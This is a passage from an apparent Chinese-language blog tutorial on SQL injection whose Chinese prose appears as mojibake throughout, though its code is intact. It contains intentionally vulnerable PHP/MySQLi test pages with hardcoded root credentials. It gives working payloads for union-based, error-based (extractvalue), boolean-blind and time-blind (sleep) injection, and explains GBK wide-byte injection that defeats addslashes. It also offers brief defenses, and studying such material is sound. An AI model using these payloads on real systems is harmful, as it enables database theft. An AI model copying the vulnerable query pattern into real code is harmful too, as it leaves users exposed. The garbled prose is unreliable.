class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æµ‹è¯•ä»£ç ä½¿ç”¨MySQLi (é¢å‘è¿‡ç¨‹)è¿›è¡Œè¿æ¥ï¼Œéƒ¨åˆ†ä»£ç å‚è€ƒäºsqlilabsæºç ã€‚</p><h1 id="å›æ˜¾æ³¨å…¥"><a href="#å›æ˜¾æ³¨å…¥" class="headerlink" title="å›æ˜¾æ³¨å…¥"></a>å›æ˜¾æ³¨å…¥</h1><p>å›æ˜¾æ³¨å…¥æ˜¯æŒ‡æˆ‘ä»¬çš„æŸ¥è¯¢å†…å®¹ä¼šæ˜¾ç¤ºåˆ°é¡µé¢ä¸­,é€ æˆçš„åŸå› ä¹‹ä¸€æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚</p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLå¸¸è§„å›æ˜¾æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your usernameï¼š&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your passwordï¼š&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306225550792.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232323655.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,(select database()),(select version())--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306224726475.png"></p><p><strong>é˜²å¾¡ä»£ç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</span></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307192422989.png" alt="image-20210307192422989"></p><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><p>æŠ¥é”™æ³¨å…¥æ˜¯æŒ‡é¡µé¢ä¸è¿”å›å†…å®¹æ•°æ®ï¼Œæ— æ³•ä»å›æ˜¾ç»“æœè·å¾—ä¿¡æ¯ï¼›ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šä¿ç•™SQLçš„æŠ¥é”™å‡½æ•°<code>mysqli_error()</code> ï¼›é€šè¿‡<code>extractvalue</code> <code>UpdateXml</code> <code>floor</code>ç­‰å‡½æ•°æ„é€ é”™è¯¯çš„è¯­å¥ä»¥ä»æŠ¥é”™ä¿¡æ¯ä¸­è·å¾—æƒ³è¦çš„ä¿¡æ¯ã€‚é€ æˆçš„åŸå› ä¹‹ä¸€ä¹Ÿæ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥è¾“å…¥éé¢„æœŸçš„å†…å®¹ä»è€Œè·å¾—æ•æ„Ÿçš„æ•°æ®ï¼Œåªä¸è¿‡æŠ¥é”™æ³¨å…¥æ˜¯åˆ©ç”¨é”™è¯¯ä¿¡æ¯å›æ˜¾ã€‚</p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLæŠ¥é”™æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232515661.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232739874.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶å–æ¶ˆæŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºç­‰ã€‚</p><h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><p>ç›²æ³¨æŒ‡æ— æ³•åˆ©ç”¨å›æ˜¾å’ŒæŠ¥é”™ä¿¡æ¯ç­‰æƒ…å†µï¼Œè¿›è¡Œçš„ä¸€ç§sqlæ³¨å…¥æ–¹æ³•ã€‚</p><p>ç›²æ³¨ä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>å¸ƒå°”ç›²æ³¨ï¼šé€šè¿‡åˆ¤æ–­é¡µé¢å“åº”æƒ…å†µåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</li><li>æ—¶é—´ç›²æ³¨ï¼šåˆ©ç”¨é¡µé¢åŠ è½½æ—¶é—´æ¥åˆ¤æ–­åç«¯æ•°æ®åº“æ˜¯å¦æ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„sqlè¯­å¥ï¼Œæœ¬è´¨è¿˜æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥éšæ„é—­åˆï¼Œæ„é€ è‡ªå·±éœ€è¦çš„sqlè¯­å¥ã€‚</li></ul><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLç›²æ³¨ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not in ...&#x27;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>; <span class="comment">// å¸ƒå°”ç›²æ³¨</span></span><br><span class="line">         <span class="comment">//echo &#x27;You are in ...&lt;hr&gt;&#x27;; // æ—¶é—´ç›²æ³¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¸ƒå°”ç›²æ³¨å¯¹åº”é¡µé¢ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234906381.png"></p><p>æ·»åŠ å•å¼•å·åä¸æŠ¥é”™ï¼Œä½†é¡µé¢å“åº”ä¸åŒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234936476.png"></p><p>æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;5--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;3--+</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235533662.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235615337.png"></p><p>ä¸Šé¢ç»“æœè¯´æ˜å½“å‰æ•°æ®åº“åå­—çš„é•¿åº¦åœ¨3~5ä¹‹é—´ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—åˆ°å…¶ä»–ä¿¡æ¯ã€‚</p><p><strong>æ—¶é—´ç›²æ³¨å¯¹åº”é¡µé¢ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084559117.png"></p><p>æ·»åŠ å•å¼•å·åä¸æŠ¥é”™ï¼Œä¸”é¡µé¢å“åº”ç›¸åŒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084635657.png"></p><p>æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(5))--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;4,sleep(5),1)--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;116,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090147625.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090340750.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307091305473.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ç­‰ã€‚</p><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p>å½“mysqlæ•°æ®åº“é‡‡ç”¨GBKç¼–ç æ—¶å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚</p><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç ï¼ˆGBKå°±æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ä¹‹ä¸€ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ï¼‰çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ï¼Œè€Œå½“æˆ‘ä»¬è¾“å…¥æœ‰å•å¼•å·æ—¶ä¼šè‡ªåŠ¨åŠ å…¥\è¿›è¡Œè½¬ä¹‰è€Œå˜ä¸º\â€™ï¼ˆåœ¨PHPé…ç½®æ–‡ä»¶ä¸­magic_quotes_gpc=Onçš„æƒ…å†µä¸‹æˆ–è€…ä½¿ç”¨addslasheså‡½æ•°ï¼Œicovå‡½æ•°ï¼Œmysql_real_escape_stringå‡½æ•°ã€mysql_escape_stringå‡½æ•°ç­‰ï¼Œæäº¤çš„å‚æ•°ä¸­å¦‚æœå¸¦æœ‰å•å¼•å·â€™ï¼Œå°±ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰\â€™ï¼Œä½¿å¾—å¤šæ•°æ³¨å…¥æ”»å‡»æ— æ•ˆï¼‰ï¼Œç”±äºå®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå°†åé¢çš„ä¸€ä¸ªå­—èŠ‚ä¸å‰ä¸€ä¸ªå¤§äº128çš„asciiç è¿›è¡Œç»„åˆæˆä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ï¼Œæ­¤æ—¶â€™å‰çš„\å°±è¢«åƒäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨â€™äº†ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä»è€Œå¯å®æ–½SQLæ³¨å…¥çš„åˆ©ç”¨ã€‚æœ€å¸¸ä½¿ç”¨çš„å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨%dfï¼Œå…¶å®æˆ‘ä»¬åªè¦ç¬¬ä¸€ä¸ªasciiç å¤§äº128å°±å¯ä»¥äº†ï¼Œæ¯”å¦‚asciiç ä¸º129çš„å°±å¯ä»¥ï¼Œå³ä¸º%81ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.51cto.com/eth10/1962804">æµ…è°ˆå¯¹å®½å­—èŠ‚æ³¨å…¥çš„è®¤è¯†</a></p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLå®½å­—èŠ‚æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®GBKç¼–ç </span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">// addslashes()å‡½æ•°ï¼Œåœ¨é¢„å®šä¹‰ç¬¦å·å‰æ·»åŠ åæ–œæ </span></span><br><span class="line">    <span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your usernameï¼š&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your passwordï¼š&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    